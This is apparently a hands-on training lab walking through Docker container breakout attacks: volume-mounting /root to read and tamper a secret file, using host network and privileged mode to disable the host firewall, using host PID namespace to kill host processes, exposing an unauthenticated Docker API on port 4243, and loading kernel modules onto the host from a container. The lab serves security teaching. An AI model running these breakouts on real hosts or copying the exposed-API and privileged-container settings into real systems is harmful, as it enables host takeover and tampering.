# **Container Breakout - Multiple Attacks**

### *Gaining access and tampering Host resources from a container*

### **Lab Image : `Containers`**

-------

## *Volume Mounts*

### * *

-------

#### Step 1:

* Validate that you are the `root` user on the provisioned server

```commandline
whoami
```

* Validate that there's a secret file in the root directory

```commandline
cat /root/secret.txt
```

-------

#### Step 2:

* Switch to a non-root user

```commandline
sudo su we45
```
```commandline
whoami
```

* Check if the non-root user(`we45`) has access to `docker`

```commandline
docker images
```
```commandline
docker ps
```

* Try to read the contents of the `secret` file created by the root user

```commandline
cat /root/secret.txt
```

-------

#### Step 3:

* As a non-root user(`we45`), launch a container and expose the root-filesystem

```commandline
docker run -ti --rm -v /root:/hostFS/ alpine sh
```

* On the container, try to read and edit the secret file

```commandline
cat /hostFS/secret.txt
```
```commandline
echo "Tampered data!!" >> /hostFS/secret.txt
```

* Exit from the container

```commandline
exit
```

* Switch to `root` user

```commandline
exit
```

-------

#### Step 4:

* Stop all containers

```commandline
clean-docker
```

-------

## *Host Network*

### * *

-------

#### Step 1:

* Check `ufw` status on the provisioned server

```commandline
ufw status
```

* Enable `ufw` and allow `ssh` to ensure that the connection to the provisioned server persists

```commandline
ufw enable
```
```commandline
ufw allow ssh
```
```commandline
ufw status
```

-------

#### Step 2:

* Launch a container binding the host network to the docker network

```commandline
docker run -d -p 5000:5000 --privileged --net=host abhaybhargav/vul_flask
```

* Fetch the `CONTAINER_ID` of the running container

```commandline
docker ps
```

* Exec into the container environment

```commandline
docker exec -ti <CONTAINER_ID> /bin/bash
```

-------

#### Step 3:

* On the container, install the firewall program(`ufw`)

```commandline
apt update 
```
```commandline
apt install -y ufw
```

* Check the status of the firewall inside the container

```commandline
ufw status
```

* Disable the host machine firewall from a container

```commandline
ufw disable
```
```commandline
ufw status
```

* Exit from the container

```commandline
exit
```

-------

#### Step 4:

* Stop all containers

```commandline
clean-docker
```

---------

## *PID Boundary*

### * *

-------

#### Step 1:

* Navigate to the `Container Breakout` directory on the provisioned server

```commandline
cd /root/container-training/Container/container-breakout/
```

* Multiplex terminal session with `tmux` and split panes horizontally.

```commandline
tmux
```
```commandline
tmux split-window -v
```

-------

#### Step 2:

* Create a "Super Important Process" that is to be tampered with

```commandline
command='while true\ndo\necho "Super important process running $$"\nsleep 3\ndone'
```
```commandline
printf "$command" > super_important_process.sh && chmod +x super_important_process.sh
```

* Run the "Super Important Process" that was just created and fetch the `Process-ID`

```commandline
./super_important_process.sh
```

-------

#### Step 3:

* With `tmux`, switch to the lower panel

> ###### Switch to the lower panel with `ctrl` + `b` and then `lower arrow key`

* Launch a container and mount the host processes on the container

```commandline
docker run -ti --pid=host --privileged alpine sh
```

* Inside the container, try to terminate the "Super Important Process"

```commandline
kill <PID>
```

-------

#### Step 4:

* Exit from the `tmux` sessions and stop all the containers

```commandline
clean-docker
```

---------

## *Docker Config*

### *A malicious user who gains access Docker API, can launch a container and gain access to the host machine with root permissions.*

-------

#### Step 1:

* Navigate to the `Container Breakout` directory on the provisioned server

```commandline
cd /root/container-training/Container/container-breakout/
```

* Enable the docker API

```commandline
sed -i '/ExecStart/c\ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:4243' /lib/systemd/system/docker.service
```
```commandline
systemctl daemon-reload
```
```commandline
service docker restart
```

-------

#### Step 2:

* Fetch the IP of the provisioned server

```commandline
serverip
```

* Run an Nmap Scan on the provisioned server to get the list of port and services

> ###### We're running scan against a single port to save some time, but this might take a while
```commandline
nmap $(serverip) -sV -p 4243
```

* On the browser, verify access to the docker API

```commandline
echo "http://$(serverip):4243/version"
```
```commandline
echo "http://$(serverip):4243/images/json"
```

-------

#### Step 3:

* Create and activate the python virtual environment and run the script that will launch a malicious container via. the docker API.

```commandline
apt install -y virtualenv && export LC_ALL="en_US.UTF-8" && export LC_CTYPE="en_US.UTF-8"
```
```commandline
virtualenv venv
```
```commandline
source venv/bin/activate
```
```commandline
pip install docker
```
```commandline
python launch-malicious-docker.py
```

* On the browser, try to access the service running on the container

```commandline
echo "http://$(serverip):6080/vnc.html"
```

* Once connected to the `VNC`, `Right-Click` to get access to the container terminal

-------

#### Step 4:

* On the container terminal, fetch the list of loaded kernel modules

```commandline
apt update && apt install -y kmod
```
```commandline
lsmod
```

-------

#### Step 5:


* Vulnerable and Malicious Kernel modules can also be loaded from the container onto the host-machine kernel

```commandline
insmod /rootFS/lib/modules/4.x.x-xxx-generic/kernel/fs/isofs/isofs.ko
```
```commandline
lsmod | grep isofs
```

* Switch to the provisioned server and confirm if the Malicious kernel module has been loaded successfully

```commandline
lsmod | grep isofs
```

-------

#### Step 5:

* Remove the `isofs` module that has been previously loaded and confirm

```commandline
rmmod isofs
```
```commandline
lsmod
```

* Stop all containers

```commandline
clean-docker
```

---------

### Reading Material/References:
